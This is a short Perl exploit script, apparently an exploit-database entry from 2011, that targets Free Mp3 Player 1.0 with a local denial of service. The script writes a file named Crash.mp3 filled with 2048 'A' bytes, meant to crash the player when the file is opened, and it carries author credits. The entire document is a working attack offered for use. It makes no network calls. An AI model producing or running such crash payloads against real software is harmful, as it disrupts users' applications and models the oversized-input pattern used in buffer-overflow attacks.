#!/usr/bin/perl
 
# Exploit Title:  Free Mp3 Player 1.0 Local Denial of Service
# Date: 19-12-2011
# Author: JaMbA
# Download:
http://www.softpedia.com/get/Multimedia/Audio/Audio-Players/Free-Mp3-Player.shtml
# Version: 1.0
# Tested on: Windows 7
 
my $file= "Crash.mp3";
my $junk= "\x41" x 2048;
open($FILE,">$file");
print $FILE $junk;
print "\nCrash.mp3 File Created successfully\n";
print "\ Dz-Devloper Work Team (Ahmadso best friend)\n";
close($FILE);
